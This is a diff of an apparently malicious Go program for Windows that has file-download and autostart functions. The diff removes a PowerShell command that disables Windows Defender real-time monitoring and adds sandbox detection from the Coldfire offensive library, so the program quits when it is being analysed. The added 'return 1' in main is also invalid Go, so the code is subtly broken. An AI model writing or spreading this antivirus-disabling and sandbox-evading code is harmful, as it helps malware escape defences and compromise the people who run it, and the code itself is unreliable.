@@ -13,13 +13,10 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
+	"unsafe"
 
 	"golang.org/x/sys/windows"
-)
-
-const (
-	PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000
-	PROCESS_MODE_BACKGROUND_END   = 0x00200000
+	"github.com/redcode-labs/Coldfire"
 )
 
 func downloadFile(filepath string, url string) (err error) {
@@ -220,9 +217,9 @@ func autostart() {
 }
 
 func main() {
-	cmd := exec.Command("powershell", "Set-MpPreference -DisableRealtimeMonitoring $true")
-	cmd.Run()
-
+	if Coldfire.SandboxAll() {
+		return 1
+	}
 	f, err := os.OpenFile("log.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 	if err != nil {
 		log.Fatalf("error opening file: %v", err)
